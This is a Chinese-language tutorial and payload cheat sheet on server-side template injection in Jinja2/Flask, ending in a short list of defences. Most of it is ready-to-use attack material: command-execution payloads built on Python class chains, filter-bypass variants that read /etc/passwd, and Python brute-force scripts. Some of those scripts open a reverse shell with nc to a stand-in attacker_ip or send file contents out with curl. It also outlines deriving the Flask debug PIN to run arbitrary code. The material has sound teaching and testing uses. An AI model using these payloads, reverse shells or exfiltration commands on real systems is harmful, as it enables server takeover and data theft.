# Server-Side Template Injection (SSTI)

> **参考：** [XXE](../XML%20External%20Entity%20(XXE)/XML%20External%20Entity%20(XXE).md) | [PHP Deserialization](../PHP%20Deserialization/PHP%20Deserialization.md)

---

## 什么是 SSTI？

服务器端模板注入（Server-Side Template Injection，简称 SSTI）是一种 Web 安全漏洞，发生在使用模板引擎的 Web 应用程序中。当应用程序将用户输入直接拼接到模板中，模板引擎将输入当作模板指令执行时，攻击者可以在服务器上执行任意代码。

**核心理解：**

- **服务器端：** 漏洞的利用和影响发生在服务器上，而非浏览器中（这与 XSS 不同）
- **模板：** 用于生成动态 HTML 页面的模板文件，包含静态内容和动态占位符
- **注入：** 攻击者将恶意表达式注入到模板中，被模板引擎在服务器端执行

### 一个简单示例

**正常情况：**

```
URL: http://example.com/welcome?name=Alice
模板代码: <h1>Hello, {{ name }}!</h1>
渲染结果: <h1>Hello, Alice!</h1>
```

`{{ name }}` 是 Jinja2 模板语法，模板引擎将变量 `name` 替换为实际值。

**存在 SSTI 漏洞的情况：**

```
URL: http://example.com/welcome?name={{ 7 * 7 }}
渲染结果: <h1>Hello, 49!</h1>
```

服务器执行了 `{{ 7 * 7 }}`，结果变为 `49`，确认 SSTI 漏洞存在。

### SSTI 的危害

一旦确认 SSTI，攻击者通常可以实现：

1. **读取敏感文件：** 读取服务器上的密码文件、配置文件、源代码
2. **远程代码执行（RCE）：** 完全控制服务器
3. **攻击内部网络：** 以服务器为跳板攻击内网系统
4. **篡改网站内容：** 修改网页，植入恶意代码

---

## SSTI 的产生原因

根本原因是**将用户输入与模板代码不加区分地混合在一起**。

### 安全的代码（不会产生 SSTI）

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    name = request.args.get('name')
    html_str = '''
        <html>
        <head></head>
        <body>{{ name }}</body>
        </html>
    '''
    return render_template_string(html_str, name=name)
```

`render_template_string(html_str, name=name)` 将 `name` 作为变量传入模板。`{{ name }}` 中的内容会被预先渲染转义过滤，然后才输出 -- **安全**。

### 存在漏洞的代码

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    name = request.args.get('name')
    html_str = '''
        <html>
        <head></head>
        <body>{0}</body>
        </html>
    '''.format(name)
    return render_template_string(html_str)
```

`format(name)` 将用户输入直接拼接进模板字符串，`render_template_string()` 将输入当作模板代码执行 -- **存在 SSTI 漏洞**。

> **核心区别：** 安全方式是用户输入作为变量传入模板（数据与代码分离）；漏洞方式是用户输入直接拼接进模板字符串（数据与代码混合）。

---

## 漏洞检测

### 基础探测 Payload

检测 SSTI 最常用的方法是提交模板表达式并观察是否被求值：

**数学运算探测：**

```
{{ 7 * 7 }}      -- 返回 49 则可能存在 SSTI
{{ 1+2 }}        -- 返回 3 则可能存在 SSTI
{{ 100/10 }}     -- 返回 10.0 则可能存在 SSTI
```

**字符串操作探测：**

```
{{ "hello" }}         -- 返回 hello
{{ "he"+"llo" }}      -- 返回 hello
{{ "A"*10 }}          -- 返回 AAAAAAAAAA
{{ "a"~"b" }}         -- 返回 ab（Jinja2 的 ~ 运算符）
```

**类属性探测：**

```
{{ "".__class__ }}         -- 返回 <class 'str'>
{{ [].__class__ }}         -- 返回 <class 'list'>
{{ ().__class__ }}         -- 返回 <class 'tuple'>
{{ config }}               -- 返回 Flask 配置对象
{{ request }}              -- 返回请求对象
{{ self }}                 -- 返回模板对象
```

### 模板引擎识别

不同模板引擎语法不同，通过尝试不同语法确定引擎类型：

| 语法 | 对应引擎 |
|------|---------|
| `{{ 7*7 }}` | Jinja2, Twig, Django |
| `${7*7}` | FreeMarker, Velocity |
| `<%= 7*7 %>` | ERB, EJS |
| `#{7*7}` | Pug/Jade |
| `[[7*7]]` | AngularJS |

**识别流程（决策树）：**

1. 使用 `${7*7}` 测试，如果返回 `49` 则为 FreeMarker/Velocity 类引擎，继续用 `a{* comment *}b` 验证 Smart 引擎
2. 如果失败，使用 `{{7*7}}` 测试，返回 `49` 则为 Jinja2/Twig 类引擎
3. 使用 `{{"".__class__}}` 进一步确认（Jinja2/Python 环境特有）

### 环境信息探测

```
{{ config }}                              -- Flask 配置
{{ config.items() }}                      -- 所有配置项
{{ request }}                             -- 请求对象
{{ request.environ }}                     -- 服务器环境信息
{{ lipsum }}                              -- Jinja2 内置函数
{{ get_flashed_messages }}                -- Flask 函数
{{ url_for }}                             -- Flask URL 生成函数
{{ self.__dict__ }}                       -- 模板内部对象
{{ self._TemplateReference__context.keys() }}  -- 模板上下文所有键
```

---

## Jinja2 利用技术

### 核心攻击链

SSTI 在 Jinja2/Flask 环境下的利用遵循一条固定路径 -- 通过 Python 的类继承体系找到 `object` 类，枚举其所有子类，从中找到包含 `os` 模块或危险函数的类，最终执行系统命令。

**类继承探索链（最常用路径）：**

```
''.__class__                -> 获取字符串类 <class 'str'>
    .__bases__[0]           -> 获取父类 <class 'object'>
    .__subclasses__()       -> 获取 object 的所有子类列表
    [index]                 -> 选择第 index 个子类（如 os._wrap_close）
    .__init__               -> 获取该类的初始化方法
    .__globals__            -> 获取模块全局变量字典
    ['os'] 或 ['popen']     -> 访问 os 模块或 popen 函数
    .popen('cmd').read()    -> 执行系统命令
```

**完整 Payload：**

```jinja2
{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('whoami').read() }}
```

### 常用可利用子类

通过 `__subclasses__()` 返回的列表中寻找可用于命令执行的类：

| 索引（示例） | 类名 | 利用方式 |
|-----------|------|---------|
| 117 | `os._wrap_close` | `.init.__globals__['popen']('cmd').read()` |
| 166 | `subprocess.Popen` | 直接执行命令 |
| 199 | 包含 `os` 模块的类 | `.init.__globals__['os'].popen('cmd').read()` |
| 69 | `_frozen_importlib.BuiltinImporter` | `.load_module('os').popen('cmd').read()` |

> **注意：** 子类索引因 Python 版本和环境而异。实际利用时需要先枚举 `__subclasses__()` 确定目标类的具体索引。

### 自动枚举可用子类

使用 `{% for %}` 循环遍历子类列表，查找包含 `os` 模块的类：

```jinja2
{% for i in range(300) %}
    {% set cls = ''.__class__.__bases__[0].__subclasses__()[i] %}
    {% if cls.__init__ and cls.__init__.__globals__ and 'os' in cls.__init__.__globals__ %}
        索引 {{ i }} ({{ cls.__name__ }}) 包含 os 模块
    {% endif %}
{% endfor %}
```

### 多种命令执行路径

除了通过 `''.__class__.__bases__[0].__subclasses__()[117]` 这条路径，还可以通过 Flask 和 Jinja2 的内置对象直接访问 `os` 模块：

**通过 config：**

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

**通过 url_for：**

```jinja2
{{ url_for.__globals__.os.popen('whoami').read() }}
```

**通过 lipsum：**

```jinja2
{{ lipsum.__globals__.os.popen('pwd').read() }}
```

**通过 get_flashed_messages：**

```jinja2
{{ get_flashed_messages.__globals__.os.popen('pwd').read() }}
```

**通过 request.application：**

```jinja2
{{ request.application.__globals__.os.popen('whoami').read() }}
```

**通过 cycler/joiner/namespace：**

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**通过 `__builtins__` 动态导入（当 popen 不可直接访问时）：**

```jinja2
{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}
```

**通过 BuiltinImporter 手动加载 os 模块：**

```jinja2
{{ ''.__class__.__bases__[0].__subclasses__()[69]["load_module"]("os")["popen"]("ls -l").read() }}
```

### config 信息收集

```jinja2
{{ config }}                                           -- 所有配置
{{ url_for.__globals__['current_app'].config }}         -- 通过 url_for 获取
{{ get_flashed_messages.__globals__['current_app'].config }}  -- 通过其他函数获取
```

---

## 绕过技术

### 过滤 `{{ }}` -- 使用 `{% %}` 控制语句

`{% %}` 是 Jinja2 的控制语句分隔符，用于执行逻辑操作而非直接输出。当 `{{ }}` 被过滤时，可以使用 `{% %}` 进行攻击：

| 语法 | 用途 |
|------|------|
| `{{ }}` | 输出表达式 |
| `{% %}` | 控制语句（条件、循环、赋值） |

**基础测试：**

```jinja2
{% if 2>1 %}benben{% endif %}       -- 返回 benben 说明 {%%} 可用
{% if ''.__class__ %}nihao{% endif %}  -- 返回 nihao 说明可访问对象
```

**多步骤命令执行：**

```jinja2
{% set builtins = ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['__builtins__'] %}
{% set os_module = builtins['__import__']('os') %}
{% set result = os_module.popen('ls -la').read() %}
{{ result }}
```

**枚举可用类索引：**

```jinja2
{% for i in range(200) %}
    {% set cls = ''.__class__.__bases__[0].__subclasses__()[i] %}
    {% if cls.__init__ and cls.__init__.__globals__ %}
        {% if 'os' in cls.__init__.__globals__ %}
            索引 {{ i }} ({{ cls.__name__ }}) 包含 os 模块
        {% endif %}
    {% endif %}
{% endfor %}
```

### 过滤 `[]` -- 使用 `__getitem__()` 或 `pop()`

```jinja2
# 原始（使用 []）
{{ ''.__class__.__bases__[0].__subclasses__()[117] }}

# 绕过（使用 __getitem__()）
{{ ''.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(117) }}

# 绕过（使用 pop()）
{{ ''.__class__.__bases__.pop(0).__subclasses__().pop(117) }}
```

**完整绕过示例：**

```jinja2
{{ "".__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /etc/passwd').read() }}
```

### 过滤引号 -- 使用 request 对象

Flask 的 `request` 对象允许从 HTTP 请求中获取参数值，避免直接使用引号：

| 方法 | 获取来源 |
|------|---------|
| `request.args.key` | GET 参数 |
| `request.form.key` | POST 表单参数 |
| `request.cookies.key` | Cookie |
| `request.headers.key` | 请求头 |
| `request.values.key` | 所有参数 |
| `request.data` | POST 原始数据 |
| `request.json` | POST JSON 数据 |

**GET 方式绕过：**

```
URL: /vuln?class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__&index=117&init=__init__&globals=__globals__&func=popen&cmd=cat /etc/passwd
```

```jinja2
{{ ''|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(request.args.index|int)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.func)(request.args.cmd)|attr('read')() }}
```

**POST 方式绕过：**

```jinja2
code={{ ().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.form.k1)(request.form.k2).read() }}&k1=popen&k2=cat /etc/passwd
```

**Cookie 方式绕过：**

```jinja2
{{ ().__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read() }}
```

### 过滤器绕过（attr 过滤器 + request）

`attr()` 过滤器可以在运行时通过字符串访问对象属性，配合 `request` 实现完整的绕过：

```jinja2
{{ ''|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(117)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.func)(request.args.cmd)|attr('read')() }}
```

**常用 Jinja2 过滤器：**

| 过滤器 | 作用 | 示例 |
|--------|------|------|
| `attr("name")` | 获取对象属性 | `""|attr("__class__")` |
| `length()` | 获取长度 | `"abc"|length` -> `3` |
| `join(sep)` | 连接序列 | `["a","b"]|join` -> `"ab"` |
| `reverse()` | 反转字符串 | `"hello"|reverse` -> `"olleh"` |
| `replace(old,new)` | 替换 | `"test"|replace("e","a")` -> `"tast"` |
| `list()` | 转为列表 | `"abc"|list` -> `['a','b','c']` |
| `string()` | 转为字符串 | 可用于获取特殊字符 |
| `upper()` / `lower()` | 大小写转换 | 基础探测用 |

### 过滤关键词（`__class__` 等）

**十六进制编码：**

```jinja2
{{ ""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"] }}     -- __class__
{{ ""["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"] }}         -- __base__
```

**Unicode 编码：**

```jinja2
{{ ""["__class__"] }}
```

> **注意：** Unicode 转义在 `attr()` 的字符串参数中有效，但不能直接在点号属性访问中使用（如 `.__class__` 无效）。原因是点号语法在 Jinja2 解析阶段处理，而 `attr()` 过滤器在运行时处理。

**字符串拼接：**

```jinja2
{{ ""["__cla"+"ss__"] }}
{{ ""["__cla"+"ss__"]["__ba"+"se__"] }}
```

**Jinja2 `~` 运算符拼接：**

```jinja2
{% set a="__cla" %}{% set b="ss__" %}{{''[a~b]}}
```

**使用过滤器构造字符串：**

```jinja2
# reverse 反转
{% set a="__ssalc__"|reverse %}{{""[a]}}

# replace 替换
{% set a="__claee__"|replace("ee","ss") %}{{""[a]}}

# join 连接
{% set a=['__cla','ss__']|join %}{{""[a]}}

# dict + join 取键名
{% set a=dict(__class__=x)|join %}{{""[a]}}
```

**使用 chr() 函数构造：**

```jinja2
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{ ''[chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95)] }}
```

> **`%2b` vs `~`：** 在 URL 中 `+` 会被解析为空格，因此 HTTP 传输时不能用 `+` 拼接字符串。使用 `%2b`（URL 编码的 `+`）或 Jinja2 的 `~` 运算符替代。

如果 `__builtins__` 也被过滤：

```jinja2
{% set chr=url_for.__globals__['__builtins__'].chr %}
```

或：

```jinja2
{% set btins_str = '__built' ~ 'ins__' %}
{% set chr=url_for.__globals__[btins_str].chr %}
```

### 过滤数字 -- 使用 length 构造

```jinja2
# 通过字符串长度构造任意数字
{% set x="aaaaaaaaaa"|length %}   -- 10
{% set y="aaa"|length %}          -- 3
{% set index=x*x-y %}             -- 10*10-3=97

# 或者通过 dict+join+count
{% set x=dict(aaaaaaa=1)|join|count %}  -- 7
{% set y=dict(aaaaaaa=1)|join|count %}  -- 7
{% set c=x*y %}                         -- 49
```

### 过滤 `_` 字符 -- 从特殊对象中提取

当 `_` 和引号都被过滤时，需要从已有的对象输出中提取字符：

```jinja2
{% set x=(lipsum|string|list) %}      -- 将 lipsum 函数转为字符串再转为字符列表
{% set xhx=x|attr('pop')(18) %}      -- 从列表中取出位置 18 的字符 "_"
{% set kg=x|attr('pop')(9) %}        -- 取出空格
```

### 综合过滤绕过示例

**场景：过滤了 `'` `"` `+` `request` `.` `[` `]` 空格 `0-9` `_` `\` `+`**

```jinja2
{%set nine=dict(aaaaaaaaa=x)|join|count%}
{% set two=dict(aa=x)|join|count %}
{%set eighteen=nine*two%}
{%set pop=dict(pop=a)|join%}
{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}
{%set kg=(lipsum|string|list)|attr(pop)(nine)%}
{%set globals=(xhx,xhx,dict(globals=x)|join,xhx,xhx)|join%}
{%set getitem=(xhx,xhx,dict(getitem=x)|join,xhx,xhx)|join%}
{%set os=dict(os=x)|join%}
{%set popen=dict(popen=x)|join%}
{%set cmd=(dict(cat=x)|join,kg,dict(flag=x)|join)|join%}
{%set read=dict(read=x)|join%}
{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
```

---

## 无回显 SSTI

当 SSTI 存在但命令执行结果不直接显示在响应中时，需要采用盲注技术。

### 反弹 Shell

通过 RCE 反弹 Shell 绕过无回显页面：

```python
import requests

url = input("url: ")
for i in range(300):
    try:
        data = {"code": '{{ ().__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("nc attacker_ip 7777 -e /bin/bash").read() }}'}
        response = requests.post(url, data=data)
    except:
        pass
```

### 外带注入（OOB）

通过 HTTP 请求将命令执行结果发送到外部服务器：

```python
import requests

url = input("url: ")
for i in range(300):
    try:
        data = {"code": '{{ ().__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("curl http://attacker_ip/`cat /etc/passwd`").read() }}'}
        response = requests.post(url, data=data)
    except:
        pass
```

### 时间盲注

利用 `sleep` 命令制造时间延迟判断命令是否执行成功：

```python
import requests
import time

url = input("url: ")
for i in range(300):
    try:
        payload = f'{{{{ "".__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__["popen"]("sleep 5").read() }}}}'
        data = {"code": payload}
        start_time = time.time()
        response = requests.post(url, data=data, timeout=10)
        end_time = time.time()
        if end_time - start_time > 4:
            print(f"[+] Index {i} usable! Execution time: {end_time - start_time:.2f}s")
    except requests.exceptions.Timeout:
        print(f"[+] Index {i} may be usable (request timeout)")
    except:
        pass
```

### 布尔盲注

通过响应差异判断漏洞是否触发：

```python
import requests

url = input("url: ")
for i in range(300):
    try:
        payload = f'{{{{ "".__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__.get("popen") if "".__class__.__bases__[0].__subclasses__()[{i}].__init__ else "" }}}}'
        data = {"code": payload}
        response = requests.post(url, data=data, timeout=5)
        if "built-in method" in response.text or "function" in response.text:
            print(f"[+] Index {i} usable - contains popen function")
    except:
        pass
```

---

## Flask Debug PIN 利用

### 什么是 Debug PIN？

Debug PIN 是 Werkzeug 框架（Flask 的底层服务器）在开启调试模式时生成的一个安全密码，用于保护调试器界面不被未授权访问。当应用开启 debug 模式且存在文件读取漏洞时，可以通过计算 PIN 码进入调试器执行任意 Python 代码。

### PIN 码构成参数

| 参数 | 说明 | 获取方式 |
|------|------|---------|
| `username` | 运行 Flask 进程的系统用户名 | 读取 `/etc/passwd` 或报错页面 |
| `modname` | 固定值 `flask.app` | 默认不变 |
| `app_name` | 固定值 `Flask` | 默认不变 |
| `app_path` | Flask app.py 的绝对路径 | 通过 debug 报错页面获取或推测 |
| `mac_address` | 服务器网卡 MAC 地址的十进制值 | 读取 `/sys/class/net/eth0/address` |
| `machine_id` | 机器标识符 | 读取 `/etc/machine-id` 或 `/proc/1/cgroup` |

### 获取各参数的方法

**app_path -- Flask 的 app.py 路径：**

通过触发 debug 报错页面获取（如访问不存在的路由），报错信息中通常包含文件路径。

> **Python 2.7 注意：** Python 2.7 版本的 getattr(mod, "__file__", None) 获取的是 `.pyc` 文件路径。即使得到的是 `.py` 路径，也需要改为 `.pyc`。

**mac_address -- MAC 地址：**

```
读取以下文件之一：
/sys/class/net/eth0/address
/sys/class/net/lo/address
/sys/class/net/wlan0/address
```

得到的十六进制 MAC 地址（如 `02:42:ac:11:00:02`）需要转换为十进制（如 `2252356987191820062`）。

**machine_id -- 机器标识符：**

```
Linux 物理机：/etc/machine-id
Docker 容器：/proc/1/cgroup 或 /proc/self/cgroup（内容为 linux 宿主机机器码与容器机器码的组合）
```

### PIN 码生成

收集到所有参数后，根据目标 Python 版本使用对应的 PIN 生成脚本计算出 PIN 码。在 debug 错误页面的交互式调试器中输入 PIN 码，即可执行任意 Python 代码，包括 `os.popen('cmd').read()`。

---

## 防御方案

防御 SSTI 的核心原则是**将代码与数据严格分离**。

1. **不将用户输入直接拼接到模板中：** 使用模板引擎提供的变量传递机制，而非字符串拼接。用户输入应始终作为数据而非代码处理

2. **使用沙盒模式：** 某些模板引擎提供沙盒环境，限制对危险函数和属性的访问。但沙盒可能被绕过，不能作为唯一的防御手段

3. **逻辑与渲染分离：** 不要在模板中处理复杂的、由用户驱动的业务逻辑。所有渲染逻辑应在后端代码中完成，模板只负责简单的显示

4. **静态模板设计：** 尽可能使用静态模板，动态部分仅来自后端控制器传递的、经过严格过滤的变量

5. **输入验证与过滤：** 对用户输入进行严格的类型验证和格式过滤，拒绝包含模板语法（`{{`、`{%` 等）的输入

6. **最小权限原则：** 以最低必要权限运行应用程序，限制命令执行的影响范围

7. **关闭生产环境 Debug 模式：** Flask 的 debug 模式绝不应在生产环境中启用，避免 PIN 码调试器的利用途径
